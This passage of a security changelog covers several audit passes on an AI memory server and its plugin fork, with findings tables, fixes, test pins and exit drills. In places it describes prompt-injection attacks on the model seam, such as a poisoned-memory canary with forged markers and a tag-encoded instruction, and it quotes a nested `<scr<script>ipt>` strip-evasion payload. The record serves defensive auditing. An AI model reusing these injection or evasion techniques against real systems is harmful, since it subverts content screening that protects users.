- **Scaffold (1.28.54):** the ledger (`src/spire_inventory.rs`) + the
  route tables (`src/route_guards.rs`, born from arrays at main.rs ~L12k)
  + ten pure-unit pin families relocated verbatim to their subjects.
- **Buttress (1.28.55):** the pre-main library code stops pretending to
  be an entrypoint — `src/http_limit.rs` (RateLimiter, ConnectionTracker
  + RAII, connection/RSS watchdogs), the layer-1 blocklist + quarantine
  read-seam (`src/screen.rs`), the graph read mappers
  (`src/graph_read.rs`), the boot guards (`src/boot.rs`, folded into
  bootstrap at Vaulting) — each fn moved with its pins, ledger lowered
  same-commit.
- **Vaulting (1.28.56):** the monolith becomes the thin bin — middleware
  stack + auth middlewares → `src/server/router/{mod,auth}.rs`; `app(state)`
  → `src/server/router/mod.rs` as a pure function of `AppState`; the whole
  boot region → `src/server/bootstrap.rs` (protocol-free); six family
  builders (core 17 / memory 56+3 legacy+1 GiB import / ump 12 / compliance
  10+5 gated / workflow 82 / auth 9); THE LIB FLIP (the server tree behind
  `lib.rs`, main.rs consumes `brain_server::server::…`); the law-9 authz
  matrix → `tests/authz_matrix.rs` driving the lib from OUTSIDE the crate;
  law-13 contention gauges on /metrics + /health.
- **Capstone (1.28.57):** the test mass (12,294 lines, 109 plain + 60
  tokio fns) → `tests/main_suite.rs` verbatim (include_str anchors
  re-pointed CARGO_MANIFEST_DIR-absolute; the root use-block traveled with
  it so `use super::*` resolves exactly as before); `route_guards.rs`
  re-homed to `src/server/router/` (100% rename, content unchanged);
  `spire_inventory.rs` stays beside main.rs — its subject.

### The enforcement map (which gate guards which law)

| Law | Enforcing test | Home |
|---|---|---|
| routes register ONLY under src/server/router/** | `route_registrations_live_only_under_router` (hard gate; red-proofed against a planted registration in src/config.rs; mcp.rs fenced at exactly 1 site) | `src/spire_inventory.rs` |
| server::bootstrap stays protocol-free | `bootstrap_stays_protocol_free` (hard gate; word-boundary needles; red-proofed against a planted axum type in bootstrap.rs) | `src/spire_inventory.rs` |
| main.rs is wiring-only: ≤ 300 lines, no cfg(test) region | `spire_inventory_freezes_the_thin_binary` (MAIN_RS_LINES_MAX = 300 + the region-absence pin) | `src/spire_inventory.rs` |
| the crate's test mass never shrinks | `CRATE_TEST_FLOOR` over src/ + tests/ (2,758, never decreases; `src/spire_inventory.rs:177`) | `src/spire_inventory.rs` |
| the router's registrations never silently disappear | `ROUTER_SITES_FLOOR` (255; `src/spire_inventory.rs:51`) | `src/spire_inventory.rs` |
| the wire tables never shrink without their wire change | `OPENAPI_ROUTE_ROWS_FLOOR` (214; `src/spire_inventory.rs:189`) + `AUTHZ_TABLE_ROWS_FLOOR` (200; `src/spire_inventory.rs:199`) | `src/spire_inventory.rs` |
| every AUTHZ_GATES row × principal class through the composed app | the law-9 matrix | `tests/authz_matrix.rs` |
| zero SQL in handlers | `no_sql_in_handlers_enforced` (the Foundation flip) | `src/service/mod.rs` |
| read seam + wire-contract + docs truth | docs_truth + the route-coverage/authz pins + lipstyk (CI, diff-strict) | lib + CI |

Every scanner is self-pinned inline (the Cornerstone lesson: a counter
that cannot fire guards nothing) — each gate proves, inside its own test,
that it counts a planted violation string in a comment and stays quiet on
clean source.

### Capstone gates + validation

Two grep gates born hard (no warning phase, the Foundation precedent),
each red-proofed against a planted violation BEFORE its green commit:
the route gate caught a planted registration comment in src/config.rs
naming the file; the protocol gate reported `[axum::, Router]` on a
planted axum comment in bootstrap.rs. Both plants reverted. En route the
route gate flagged its own doc comment carrying the needle literal —
rewritten; the gate polices even its documentation.

Full suite 1,265 passed / 7 ignored (--features bench) at the tip, green
at every commit; clippy `-D warnings` (bench) clean; fmt clean; CI
dry-run green (default lint+test, engine-crates, steward-harness, otel
lint+test); lipstyk diff-strict green vs the v1.28.56 tip; live smoke on
the COPY instance green (/health, /audit/verify ok, the 413 + 408 paths,
one ingest → recall round-trip).

### Ceilings (honest)

- `src/bin/mcp.rs` keeps its own router: the MCP binary is a separate
  protocol edge, not the server's composition. The carve-out is fenced
  (exactly one site) and recorded here; folding it under
  src/server/router/** would be a behavior-adjacent refactor the line's
  no-behavior-change rule forbids.
- `tests/main_suite.rs` is one ~12k-line file: the mass moved as ONE
  verbatim block (exact-text relocation, zero churn in the pins);
  splitting it per-subject is churn without a forcing function.
- The ≤ 300 pin is a pin, not a proof of minimalism: main.rs could grow
  to 299 lines of wiring noise and pass. The gate that matters is the
  route gate — registrations cannot come back.
- The Capstone ledger numbers (124 lines, 1,198 pins) drift by
  doc-comment literals under the substring needles — the needles are
  measured identically every time; that is what a freeze needs.

## 2026-09-08 — v1.28.69 "Deadbolt" — the SEAM LINE close-out (skeleton)

The SEAM LINE (v1.28.63 "Wardline" → v1.28.69 "Deadbolt") was the
remediation program for the 2026-09-06 joint audit's code-closeable
findings: the seven releases that break a documented security law or open
a model-context seam. This skeleton is the re-load anchor for the
REGISTER LINE (v1.28.70 "Twokeys" → v1.28.75 "Preflight", the program
that closes everything else in the ledger): each section below states
what is measured now and what the Register Line must re-measure before
it opens.

### The finding → release map (as shipped)

| Release | Closes | Where the fix lives |
|---|---|---|
| v1.28.63 "Wardline" | X-W1..X-W5 (the one code-false security law: `channel/out` forgery at the events seam) | reserved vocabulary at `enqueue_child`, closed run statuses, valet fence, alert-bus kind auth |
| v1.28.64 "Blackout" | X-A1..X-A3a, X-A6..X-A9 (revocation + surface identity) | revocation at authN, denylist TTL, alg compare, public-path single source, reverse route scan, INJECTION_POLICY warn |
| v1.28.65 "Meridian" | X-R1, X-R5, X-S1, X-M2 (content hygiene at the model seam) | `/suggest` untrusted labels, plugin INVISIBLE_CLASSES parity fixture, host merge-seam strip, MCP external-content idiom |
| v1.28.66 "Truthglass" | X-L1, X-L2, X-L3, X-L5 (the approver sees the truth) | approval `args` both transports, head+tail truncation with exact counts, `dsar --action` + prompts, restore interlocks |
| v1.28.67 "Pin" | X-M1, X-M3, X-C1, X-C2 (identity pinned) | MCP catalog sha256 pins + drift/ack, `BRAIN_MCP_SCOPE`, parcels `expected_signer` REQUIRED, `/ump/audit/verify` integrity census |
| v1.28.68 "Shutter" | X-E1, X-E2, X-E4 (image + beacon egress — openclaw fork + this tree's docs) | remote-image host allowlist default-OFF, favicon beacon default-OFF, data-URI 64 KiB; THREAT_MODEL §5 |
| v1.28.69 "Deadbolt" | X-E3, X-M4, X-M5, X-M6 (egress + process boundary) | resolve→validate→pin egress guard (`webhook.rs`), absolute-only harness bin, `kill_on_drop`, console pending read-role |

### What the line proved (re-measure at Register Line open)

- Every audit law that was code-false is now code-true and PINNED: the
  reserved-vocabulary gate (Wardline), revocation-before-authN
  (Blackout), the content doors (Meridian), the approval/truncation
  truth (Truthglass), tool + signer identity (Pin), the egress seats
  (Shutter + Deadbolt).
- The one WIRE break in the whole line: parcels `expected_signer`
  becoming required (Pin). Schema untouched throughout (1.28.45 →
  REGISTER-LINE-OPEN value). openapi additive-only throughout.
- The drill discipline held: Meridian's end-to-end injection proof, the
  Pin rug-pull demo, Deadbolt's four-leg boot/crank/PATH drill — each
  release carried a live transcript, not just pins.

### Register Line pre-flight checklist (what .70–.75 must carry in)

- [ ] Re-run the full ledger (§4 of the 2026-09-06 audit) against the
      .69 tip; re-verify each REGISTER-line finding still exists as
      described (X-A4, X-A5, X-R2..X-R4, X-R6..X-R7, X-W6, X-W7, X-W8,
      X-L4, X-C3..X-C6, X-C8, X-E5, X-S2, X-F3).
- [ ] Carry the ceilings forward honestly: allowlists are trust, not
      safety (Shutter); the hostcall path's loopback exception is
      operator trust (Deadbolt); pins are process-lifetime (Deadbolt);
      screen-is-a-heuristic stands even post-Pores.
- [ ] Ops debts riding along: the openclaw-side token purge (paused),
      the review-posture flip at install (Preflight), the SBOM refresh
      (Preflight).

---

# SEAM + REGISTER PROGRAM CLOSE-OUT — 2026-09-08 (v1.28.75 "Preflight")

The 2026-09-06 audit's findings ledger (§4, namespace `X-`) is fully
dispositioned. Two lines closed it: the **SEAM LINE** (v1.28.63–.70) and
the **REGISTER LINE** (v1.28.70–.75). This release is the program's exit
gate: the 1.32.x Loop line may open, with the inherited preconditions
named in CHANGELOG §[1.28.75].

## Findings ledger × disposition (55 findings; the plan's "41" undercounted — all are dispositioned)

| Findings | Disposition | Release |
|---|---|---|
| X-W1, X-W2, X-W3, X-W4, X-W5 | FIXED (reserved outbox vocabulary, run-status closure, valet fence, alert-bus kind auth) | v1.28.63 |
| X-R1, X-R5, X-S1, X-M2 | FIXED (untrusted labels, strip-set parity fixture, host-side merge strip, MCP envelope) | v1.28.65 |
| X-L1, X-L2, X-L3, X-L5 | FIXED (approval args truth, head+tail truncation, DSAR prompts, restore interlocks) | v1.28.66 |
| X-M1, X-M3, X-C1, X-C2 | FIXED (MCP scope env, catalog pins, required signers, integrity census) | v1.28.67 |
| X-E1, X-E2, X-E4 | FIXED (remote images default-OFF + host allowlist, favicon beacon closed, data-URI budget) | v1.28.68 |
| X-E3, X-M4, X-M5, X-M6 | FIXED (public-only egress pinning, absolute steward bin, kill_on_drop, console role gate) | v1.28.69 |
| X-A4a, X-A5 | FIXED (typed agent principal, scoped telemetry) | v1.28.70 |
| X-R4, X-R6, X-R7 | FIXED (stripped-form screen, translation/anagram/encoding tiers, bridge parity, log ANSI) | v1.28.71 |
| X-R3, X-W6, X-L4, X-E5 | FIXED (element strip, write-on-read gate, SSE 403, KB escaping + locale contract) | v1.28.72 |
| X-C3, X-C4, X-W8 | FIXED (chainless-refusal, deterministic key + rotation window, bounded evictions) | v1.28.73 |
| X-S2, X-F3 | FIXED at proportionate grade (origin labels end to end; telemetry posture) | v1.28.74 |
| X-W7, X-A4b, X-C5, X-C6, X-C8 | FIXED/STATED (mediation hardened + dormancy pinned; installer review default; the two ceilings stated as docs truth; SBOM freshness gate) | v1.28.75 |
| X-A1, X-A2, X-A3, X-A6, X-A7, X-A8, X-A9, X-A10 | FIXED (kill-switch wiring, TTL match, key agility, public-path dedup, guard tables both directions, method scan, loud allow, rate buckets) | v1.28.64 |
| X-A4 (single-token half) | ACCEPTED WITH DISCLOSURE — two-token setups enforced closed; single-token deployments keep the documented legacy superuser posture (pinned; the boot warn is the nudge) | v1.28.70 |
| X-R2, X-R3 (bare-URL half), X-S3 | ACCEPTED CEILING — bare URLs linkified-but-inert; channel trust framing is prompt-text (docs-truth registered) | standing |
| X-C7 | ACCEPTED WITH DOCUMENTATION — Marvin timing model (local-daemon threat model; audit.toml ignore) | standing |
| X-F1, X-F2 | FORWARD — the 1.32.x Loop line and the WASM/payment lines carry their own addenda; .75 names the inherited preconditions | forward |

## Exit-gate drill (the four headline exploits, re-run at the close-out commit — all fail closed)

1. **`channel/out` forge via the events route** → REFUSED. Pins:
   `enqueue_child_refuses_reserved_topics`,
   `reserved_vocabulary_semantics`,
   `reserved_refusal_converts_to_loud_sql_error` — green.
2. **Steering launder via the same seam** → REFUSED (same reserved
   vocabulary covers `steering`) — green.
3. **Revoked principal on a non-mesh route** → DENIED.
   `revoked_principal_cards_fail_closed` + `revoked_owner_no_new_dispatch`
   — green (probe-blind 401/403 + dispatch re-check).
4. **Poisoned-memory canary** (tag-encoded instruction + forged
   `<active_memory_plugin>` markers + image URL) → screened/fenced/stripped:
   `meridian_canary_screen_verdict_unchanged` (the read-seam division of
   labor holds), the fence welding pins
   (`wrap_fenced_blocks_control_char_welding`,
   `wrap_fenced_blocks_invisible_near_markers`), and the .71/​.74 label
   pins — green.

## Per-release test deltas (REGISTER LINE)

| Release | CRATE_TEST_FLOOR |
|---|---|
| v1.28.69 (pre-line) | 1,303 |
| v1.28.70 Twokeys | 1,313 |
| v1.28.71 Pores | 1,336 |
| v1.28.72 Scrim | 1,345 |
| v1.28.73 Keyring | 1,356 |
| v1.28.74 Origin | 1,358 |
| v1.28.75 Preflight | 1,363 |

Live-proof transcripts: the .65 fence canary
(`docs/MERIDIAN_PROOF_20260907.md`) and the .74 origin canary (per-tree
test pins; the live group-chat drill is the Loop line's opening act —
its inherited preconditions are hardened dormant mediation + the
dormancy pin to delete on wiring, review-by-default installs, pinned
signers, origin labels).

---

# SECOND-PASS AUDIT ADDENDUM — v1.28.76 "Selfheal" (2026-09-09)

The program close-out above covers the 2026-09-06 audit (X- namespace).
A **second-pass audit** — same trees, harder questions, fresh `SP-`
namespace — then re-attacked the closures themselves. Full report is this addendum (previously `docs/SECOND_PASS_AUDIT_20260909.md`, now consolidated here).

**Result: 30 fresh findings (5 HIGH, 12 MEDIUM, 9 LOW, 4 INFO) across both
trees. v1.28.76 closes all 5 HIGH and 7 MEDIUM; the remainder are LOW/INFO
or scheduled.** The five HIGH classes, for the record:

1. **Read-seam strips healed under re-assembly (2 HIGH):**
   `<scr<script>ipt>` re-welded into a live `<script>` after the element
   strip; nested markdown constructs healed into auto-fetch images after
   the dereference. Fixed by bounded fixed-point iteration
   (`strip_to_fixpoint`, `strip_markdown_refs_does_not_heal_nested_construct`,
   `hostile_element_strip_does_not_heal_nested_tag`).
2. **The fork's .66/.67 halves were never shipped (HIGH, openclaw):**
   approval-args, head+tail truncation, and MCP catalog pins were local
   branches. Merged to fork main 2026-09-09.
3. **Compute bounds missing on the model seam (HIGH+MED):** the ONNX
   scorer serialized all screened writes behind one mutex with no
   sentence/size budget; the embedder encoded full-size content.
   Budgeted (`embed_input_is_budgeted`).
4. **Gate reach:** the identity kill-switch missed `/auth/refresh` and
   the console actors; the MCP read-scope gate missed `ump.feedback`;
   the live SSE stream leaked `valet/due` labels; the X-W4 valet fence
   missed the CAS state-advance path. All closed
   (`refresh_refuses_revoked_identity`,
   `valet_due_requires_optin_and_domain_authz`, `live_event_admissible`).
5. **Docs drift:** THREAT_MODEL frozen at v1.28.68, SECURITY.md history
   at v1.28.17, plugin changelog gaps. Swept in v1.28.76.

**Lesson recorded:** a first-pass closure is where the work starts. The
second pass found the seams the first pass's own fixes created — which is
why the trust walkthrough exists and why the audits keep running.

*Per-release delta: CRATE_TEST_FLOOR 1,358 → 1,372 (v1.28.76, incl. the
Origin-line and second-pass pins). The plugin rides at 0.6.1 (schema-declared
`untrustedOrigins`).*


---

## 2026-09-10 — third-pass fork-vs-upstream audit (v1.28.79 "Parity")

Full records kept with the audit archive (`THIRD_PASS_AUDIT_20260910.md`,
`UPSTREAM_PR_SPECS_1.28.79.md`); this entry is the summary. Scope: the
92-file `upstream/main...fork` delta across three lanes (auth/secrets,
content-trust, egress/persistence) plus direct verification of every
load-bearing claim. Every finding's file classified against
`upstream/main`: fork-only files got code, upstream files got PR specs —
zero upstream hunks.

### Findings + dispositions

| # | Finding | Severity | Disposition |
|---|---|---|---|
| H1 | Multi-block MCP results skip marker neutralization (`mcp-content.ts`) | High | **Spec'd upstream (U1)** — 5-line sketch in archive |
| H2 | Token file transmits multiline content incl. operator secret | High | **Closed** — multiline files refuse naming the agent line |
| H3 | `systemPrompt` hook bypasses the merge seam | High | **Spec'd upstream (U2)** |
| H4 | Pin hard-block opt-in (single caller passes pins path) | High | **Spec'd upstream (U3)** + threat-model disclosure |
| M1 | Redirects resend bearer off pinned origin | Medium | **Closed** — `res.url` re-pin + pre-request pin |
| M2 | Procedure writes bypass proposal Shield | Medium | **Closed-doc** — trust basis stated in-module |
| M3/M5 | Contradiction gate dead; comma-reject breaks legit proxies | Medium | **Closed** — deny-without-basis; chain commas pass |
| M4 | Null-Origin pre-pass | Medium | **Accepted-by-architecture** — post-handshake token is the gate |
| M6 | Team-bridge ignores chat-type gates | Medium | **Closed** — conjoined with recall verdict + explicit-type preference |
| M7 | Replay-prefix spoof | Medium | **Spec'd upstream (U4)** |
| A1 | Vec resurrection via reindex/bootstrap/legacy-add | Medium | **Closed** — `flagged = 0` filters + ingest-order guard on `/add` |

**Corrections to the pass's own claims:** the DSAR webhook posts
metadata only (not the bundle); refresh-family burn is the OWASP pattern;
`INJECTION_POLICY=allow` is loud by design. KCS-draft screening recorded
as a v1.28.80 follow-up (needs lifecycle design, not a guard).

---

## 2026-09-11 — deep round (all-layers, fork-diff, docs reverse-check)

Four parallel audit lanes (server auth/seams; storage/crypto/egress/workflow;
fork-vs-upstream diff; docs reverse-truth) over v1.28.81 (e39e285) + the fork
(73 ahead / 10 behind upstream/main, `git merge-tree` CLEAN). The earlier
threat-landscape round's eight findings all closed under verification
(addendum in `research/security-compliance-audit-2026-09-11-threat-landscape.md`).

### Findings + dispositions (all code fixes landed the same day)

| # | Finding | Sev | Disposition |
|---|---|---|---|
| D1 | Cross-tenant channel drain/ack: tenant dropped after HMAC auth (same-kind foreign bridge could drain/consume/ack another tenant's `channel/out` + pings) | HIGH | **Closed** — kind+tenant thread every predicate (`drain_out_batch`/`ack_out_batch`/`drain_ping_batch`); tenant assertions added to the redrill + bridge-scope pins |
| D2 | Fork MCP pins had NO production ack path (hard-block + signed-acks dead code; `pendingAck` on every tool forever) | HIGH | **Closed** (fork-only files) — `BRAIN_MCP_PINS_ACK=1` one-run acknowledgment + loud deletion note; stale header corrected; `env_ack_is_the_production_acknowledgment_path` pin |
| D3 | Read-seam gaps: `/get/{id}` `source` raw (invisible at HITL via list_proposals sanitize, promoted verbatim), `/procedure/{id}/steps` title/content raw, trace replay raw | MED | **Closed** — all three through the seam; sites added to the `stored_text_fields_pass_the_read_seam` machine table |
| D4 | `traverse:` scope satisfied every Read gate (rank collision vs the enum's own doc) | MED | **Closed** — exact-kind matching for Traverse scopes; `traverse_scope_grants_only_traverse` pin |
| D5 | Revocation drain paging no-op past page 1 (distinct cancels capped at 200) | MED | **Closed** — cancels run inside the paging loop; pages advance; `drain_incomplete` recount unchanged |
| D6 | Egress coverage: channel-bridge default-redirect client + bearer-attached fetch of a response-body URL | MED | **Closed** — `redirect::Policy::none()` + scheme/host gate (https, no IP literals, no local names) before the media fetch |
| D7 | OTLP exporter builds its own client (outside resolve→validate→pin) | MED | **Disclosed ceiling** — operator-configured endpoint, span attrs sanitized (v1.28.74); guarded exporter client is a named follow-up (THREAT_MODEL §5) |
| D8 | Standby promote + restore-verify + `write_atomic` temps plaintext-mode in shared dirs | LOW | **Closed** — 0700 workdir, 0600 at creation everywhere |
| D9 | Legal-hold re-application could fail silently while logging success | LOW | **Closed** — inserts counted; failure/incompleteness logs `error!` naming the id |
| D10 | DSAR `subject_exact` residue arms dead (equality vs JSON objects) | LOW | **Closed** — quoted-JSON containment for traces + dry-run count; proposals keep disclosed whole-content equality |
| D11 | Provenance extra keys rode inside a verified mark | LOW | **Closed** — unknown-field rejection (fail-closed `Tampered`); `extra_provenance_key_fails_closed` pin |
| D12 | Model-manifest symlink escape + `/app` prefix over-match + unbounded `source`/`jti`/`iss` | LOW | **Closed** — symlink refusal + segment-exact seat rule + `MAX_SOURCE` 64 / jti 128 / iss 256 caps |
| D13 | Fork `BRAIN_TOKEN` env rung skipped the multiline/operator-token refusal | LOW | **Closed** (fork + canonical parity) — env rung refuses multi-line values |
| D14 | Dormancy pin walked only top-level `src/*.rs` | LOW | **Closed** — recursive walk, concat-built needle (no self-match); the docs' "zero production call sites" claim is now true at every depth |
| D15 | NAT64 local-use `64:ff9b:1::/48` missing from the deny table | LOW | **Closed** — RFC 8215 row + edge literals pinned |
| D16 | Fork pin coverage asymmetric (harness/compaction/doctor lanes bypass reconcile) | MED | **Disclosed** — U3 upstream PR is the owner; ceiling named in THREAT_MODEL §5b |
| D17 | Upstream `pnpm-workspace.yaml` pins `qs` 6.15.3 (< the patched 6.16.0); `hono`/`joi` advisories unaddressed | LOW | **Upstream PR spec filed** at `~/Sites/openclaw-private/upstream-pr-specs-2026-09-11.md` (override bumps + the U3 default-pins-path re-file + S3 reference-image strip; the fork cannot edit upstream files); disclosure row in THREAT_MODEL §5b |
| D18 | Docs falsehoods: SECURITY.md history stopped at .80; "read seam unconditional" vs `/export` verbatim | LOW | **Closed** — .81 row + current line; export ceiling named in THREAT_MODEL §5 + architecture law wording |
| D19 | Plugin test drift (fork carried one extra assertion) | INFO | **Closed** — synced; `plugin/src` trees byte-identical again |

### Validation

Lib 1,202 passed / 1 ignored (pre-existing HF-fetch ignore); all 13 test
binaries green; `cargo clippy --all-targets` clean on bench + otel + default
feature sets; `cargo fmt --check` clean; `cargo audit` exit 0; lipstyk
diff-strict clean; fork suites green (pins 11/11 incl. the new env-ack pin,
plugin 187/187); fork `git merge-tree HEAD upstream/main` CLEAN with ZERO
upstream-tracked files touched by this round (the three fork edits live in
fork-only files: `extensions/brain-server/src/config.ts`,
`agent-bundle-mcp-catalog-pins.ts` + test). No schema; no routes; wire
behavior tightens only (400s on over-bound inputs, tenant-scoped drains).

**Ops adoption (same day):** the live deployment now runs `BRAIN_REQUIRE_AUTH=1`
(plist env, bootout/bootstrap reload, verified `/health/db` →
`authn.required:true`, no-token 401, agent-token recall 200 — the gateway
plugin path unaffected). The deployment runbook carries the loopback-posture
checklist (docs/deployment.md §Loopback posture).

`ponytail:` this round does NOT implement the OTLP guarded exporter client,
does NOT gate MCP tool first use, does NOT build the taint lattice, does NOT
add per-principal quotas, and does NOT touch any upstream-tracked fork file.

---

## 2026-09-12 — Fourth-pass full-spectrum audit (v1.28.82 × fork)

Dual-mode (forward + reverse) solo execution after the planned five-lane
parallel spawn failed (usage limits — disclosed in the report's §0).
Full report: `docs/SECURITY_AUDIT_20260912_FOURTH_PASS.md`. Live drill on a
fresh DB / test port 9876 (canary welds dead at the seam, quarantine excludes
from recall+suggest, kill-switch 401 live, digest approve 409 live, DSAR cert
honest, erasure verified at table level). Register-worthy findings:

| # | Finding | Severity | Disposition |
|---|---|---|---|
| F4-S-01 | `/ops/agents/revoke` is name-blind — wrong-name revoke returns `revoked:true` while the identity stays live (drill-proven with "agent" vs "agent@loopback") | Medium | Open — v1.28.83 "Candor" (loud unknown-principal refusal + pin) |
| F4-S-02 | Chunk forget leaves the approved proposal's full content copy in `proposals`; `{"deleted":true}` carries no retained-copy disclosure | Medium | Open — v1.28.83 (disclose-or-scrub + pin; Art 17(3) balance documented) |
| P4-01 | Invisible-set parity: 4 implementations, 1 exhaustive cross-pin (server↔plugin); fork+client unpinned (both verified in-sync today) | Medium | Open — v1.28.84 (generated four-tree fixture) |
| K4-01 | Fork 40 commits BEHIND upstream (premise "0 behind" stale); merge-tree clean today; semantic-conflict risk unassessed | High (operational) | Open — fork rebase lane |
| L4-01 | reg_watch pins Art 50 legacy horizon (2026-12-02) but not the passed general-application date (2026-08-02, live-verified) | Low-Med | Open — v1.28.84 (second clock row) |
| T4-01/02/03 | Seam-table comment overclaim; /get source fix lacks behavioral pin; THREAT_MODEL §6 matrix stale | Low | Open — v1.28.83 |

Mode B verdicts (held): cross-tenant drain scoping, traverse exact-kind,
provenance unknown-field rejection (14 tests green), RFC 8215 row,
OWASP-2026 citation (live-verified against the GenAI repo), plugin 0.6.5
byte-parity across repos, auto-update EdDSA signatures, badges selfcheck.
Gates in-window: fmt, lib 1202/0/1, main_suite 196/0/6, targeted pins —
all green; clippy/otel/side-lanes not run (green at release).
Outstanding lanes honestly marked in the report's coverage grid (§7):
the five subagent sweeps, fork hunk-audit, full worldwide regulatory matrix
(CT leg verified 2026-09-12 vs official PA 26-15; CRA Art 14 primary text
CLOSED same day — 24h/72h/14d + 11 Sept 2026 live date).

### Closure record — 2026-09-12 (same-day remediation pass)

All six registered findings closed; the fork finding verified closed by the
operator's rebase. Every fix carries a red-first pin and a live re-drill
where the finding was drill-proven. Full evidence in
`docs/SECURITY_AUDIT_20260912_FOURTH_PASS.md` §3 rows.

| # | Disposition | Evidence |
|---|---|---|
| F4-S-01 | **Closed** — `principal_known` core + 400 `unknown_principal` refusal (admission: `allow_unknown:true`), openapi extended | pin `revoke_unknown_principal_refused_loud`; live: typo → 400 naming `agent@loopback`, correct name → 200, admission → 200 |
| F4-S-02 | **Closed** — forget response discloses `retained_proposal_copies` in-tx + `?scrub_proposals=1` (marker + audit row per proposal); openapi extended | pin `forget_discloses_and_scrubs_retained_proposal_copy`; live: disclosure leg + scrub leg (marker observed in-DB) |
| P4-01 | **Closed** — one fixture (`plugin/fixtures/invisible-classes.json`), four lanes: server EXHAUSTIVE over all scalars, plugin per-codepoint (anti-vacuity), client, fork-host (canonical-subset contract; host extras documented) | server `invisible_set_fixture_is_exhaustive_truth`; plugin 58/58; client 240/240; fork 189/189 |
| L4-01 | **Closed** — `AI_ACT_APPLICATION = 2026-08-02` clock + dual-date statement in docs/compliance.md | pin `ai_act_application_clock_recorded` (date + ordering + doc carriage) |
| T4-01 | **Closed** — seam-table comment reworded to regression-lock scope | comment at `stored_text_fields_pass_the_read_seam` |
| T4-02 | **Closed** — behavioral pin for the `/get` source label | `get_sanitizes_source_label_behaviorally` |
| T4-03 | **Closed** — exit-gate matrix honest-scope note (future major lines; current line gated per-release) | THREAT_MODEL §6 |
| K4-01 | **Verified closed** (operator rebase) — 0 behind/76 ahead, merge-base = upstream tip; plugin 187/187; byte-parity clean | Residual for operator: uncommitted fork `pnpm-lock.yaml` typebox hunk (1.3.18→1.3.26 vs 1.3.3 manifest) needs a decision — K4-02's class |

Gates at closure: fmt (server+client) green; clippy `--all-targets -D warnings`
green; lib 1204/0/1 (+2); main_suite 199/0/6 (+3); client 240/0 (+1);
openapi + docs_truth + comment-hygiene guards green; lipstyk-gate green
(real base); badges selfcheck green. Fork: plugin lane 189/189, parity
restored (`plugin/src` ↔ `extensions/brain-server/src` byte-identical,
fixtures synced). House-discipline note: the comment-hygiene guard caught
audit-ID labels in the first draft of the fix comments — removed (the
guard's own law applied to this remediation).

### Plugin 0.6.6 parity sync — 2026-09-12

The P4-01 fixture shipped as plugin **0.6.6** (test/fixture only, no runtime
change): CHANGELOG + README updated, `scripts/sync-plugin.sh` run (oxfmt
canonical-first, byte-identity verified post-sync), fork committed as
`ab2b81486e4` (fixtures + format.test.ts lane + the fork-host lane
`src/infra/unicode-visibility.fixture.test.ts`). Fork gates at the sync:
vitest **188/188**, `tsc --noEmit` clean, `diff -rq` byte-parity OK. The
fork's uncommitted `pnpm-lock.yaml` typebox hunk (1.3.18→1.3.26 vs the
1.3.3 manifest pin) remains the operator's K4-02 decision, untouched.

---

## 2026-09-12 (evening) — Fifth-pass full-spectrum audit (v1.28.82 + closures × fork)

Second audit of the day; five parallel lanes all completed (server /
satellites / claims / fork / regulatory). Full report:
`docs/SECURITY_AUDIT_20260912_FIFTH_PASS.md`. All six fourth-pass closures
re-verified HELD in code and live (fresh DB, test port 9879: typo revoke →
400 naming `agent@loopback`; loopback revoke → 200 → agent 401; forget →
`retained_proposal_copies` + `scrubbed`). But the F4-S-01 closure carries a
**HIGH availability regression**: `unknown_principal` refusal fires for
never-seen JWT subs too, so **7/22 `authz_matrix` tests fail and main is
RED** (release.sh blocks tags — unreleasable until fixed).

| # | Finding | Severity | Disposition |
|---|---|---|---|
| A5-01 | F4-S-01 fix refuses revoke for live JWT identities with no DB row (`user:ghost` → 400 live); 7/22 authz_matrix red | HIGH | Open — v1.28.83 "Recall" (warn-not-refuse: always write, 200 + `"known":false` + hint) |
| T5-01 | Closure gates never ran the `authz_matrix` binary — "all green" record missed the red it created | MED | Open — v1.28.83 (checklist runs every test binary) |
| A5-02 | `DELETE /memory/{id}` emits no in-tx audit row (audit-per-write violation) | MED | Open — v1.28.83 |
| A5-03 | Forget cascade narrower than purge (`suggest_feedback`-by-chunk, trace/evidence refs survive) | MED-LOW | Open — v1.28.83 |
| A5-04/R5-03 | Forget correlation exact-byte-only, unbounded, `scrubbed` echoes flag | LOW | Open — v1.28.84 |
| A5-05–A5-11 | Bounds-after-probe, delegatee-drain wedge, `let _` audit write, fail-open threshold envs, get/multi-get skew, 2 vacuous-adjacent pins, dead drain bookkeeping | LOW/INFO | Open — v1.28.84 |
| R5-01/R5-02 | CSP `/app` over-match; `no_sql` needle evadable (wording) | LOW | Open — v1.28.84 |
| S5-01–S5-04 | Host superset wording, second merge seam unproven, secret-dir modes, ack wording | LOW/INFO | Open — v1.28.84 / fork lane |
| K5-01/04/05 | Fork 111-behind (velocity, merge-tree clean); LAN-bind note; npm provenance open | INFO/OPEN | Fork lane |
| L5-01–L5-07 | Map misses CO HB26-1263 + IL SB315 + federal 48h takedown clock; CT/FL/WA precision; single-forget Art 17 directive | LOW-MED | Open — v1.28.84 "Quarterly" |

Mode B: all six closures' pins revert-tested behavioral (not vacuous);
weld/approval/provenance/egress/twokeys attacks all failed (HELD).
Parity rebuilt (plugin 0.6.7 byte-clean; typebox 4-way aligned).
Regulatory: L4-01 closed; US/EU core rows re-verified vs primary sources;
component-vs-deployer split preserved. Gates: authz_matrix RED (7);
fmt/client-fmt/badges green; drill green. **Main is red: fix A5-01 first.**

---

## 2026-09-12 — v1.28.83 "Recall" SHIPPED (fifth-pass fix release + untagged fourth-pass closures)

Range `v1.28.82..v1.28.83` (15 commits: 9 fourth-pass closures never
tagged + 6 fifth-pass fixes; fork lane `60fb64b6aea` in `~/Sites/openclaw`).
Every fifth-pass finding CLOSED; full record with proof commits per bullet:
`CHANGELOG.md §[1.28.83]` (complete 1.28.82→1.28.83 account, superseding the
split "fifth-pass + carried closures" draft).

| # | Disposition | Evidence |
|---|---|---|
| A5-01 (HIGH) | **Closed** — revoke writes unconditionally (`known:false` + warning advisory); the untagged `unknown_principal` refusal never shipped | `revoke_unknown_principal_revokes_with_warning` (fails on both old shapes); `authz_matrix` 22/22; live drill: `user:ghost` → 200+warning, padded → 400 `principal_malformed`, loopback → 200, agent token → 401 |
| T5-01 | **Closed** — release-checklist no-slice law (full `cargo test` only) | checklist text; this release's gates all ran full invocations |
| A5-02/A5-03/A5-04 | **Closed** — erasure audit row in-tx; feedback-residue delete; 500-cap + `scrubbed_count`; exactness documented + Art 17 directive | `forget_erasure_is_audited_bounded_and_counted`; live: `retained_truncated:false`, `scrubbed_count:0` shape observed |
